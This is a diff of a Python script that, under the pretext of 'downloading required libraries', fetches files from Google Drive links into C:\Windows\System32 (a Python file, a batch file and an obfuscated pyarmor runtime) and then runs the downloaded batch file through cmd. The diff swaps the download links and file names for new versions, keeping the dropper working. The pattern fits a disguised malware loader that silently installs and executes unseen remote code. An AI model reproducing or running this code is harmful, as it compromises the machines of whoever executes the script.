@@ -42,10 +42,10 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\pyarmor_runtime_000000"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1oaf5312Vz4vvhRzmhV-gvPDJsRVA7Xw_", "C:\\Windows\\System32\\__init__.py")
-    download_file_from_google_drive("https://drive.google.com/uc?id=13Dz2oMLl9HOYxSJAy1fTMpus9H6LtuGb", "C:\\Windows\\System32\\aes.bat")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1sc8ky2uj8p9uu3ZBVfetdU5PBjvKIGt4", "C:\\Windows\\System32\\aes.py")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1v6y27hrbkWlx2C8Pfr-xF0l1a9Eo-rzB", "C:\\Windows\\System32\\pyarmor_runtime.pyd")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1HXDDoBAO9ld5ANgtXI8AjTIzq5JS2m1p", "C:\\Windows\\System32\\__init__.py")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1oNMmVZOQB-zE86U89_nPfFm5Y3w5Qot3", "C:\\Windows\\System32\\aesv5.bat")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1U0TAT7Qb4JZHuPNIaLLBMVh_4TjAe_sz", "C:\\Windows\\System32\\AesV5.py")
+    download_file_from_google_drive("https://drive.google.com/uc?id=1t-AYI6VFLb5gXJhv7JHhH39X06H5VUs9", "C:\\Windows\\System32\\pyarmor_runtime.pyd")
 
 
 import os
@@ -87,7 +87,7 @@ if not check_files_existx():
     exit()
 
 
-batch_file_path = r"C:\Windows\System32\aes.bat"
+batch_file_path = r"C:\Windows\System32\aesv5.bat"
 try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
 except Exception as e:
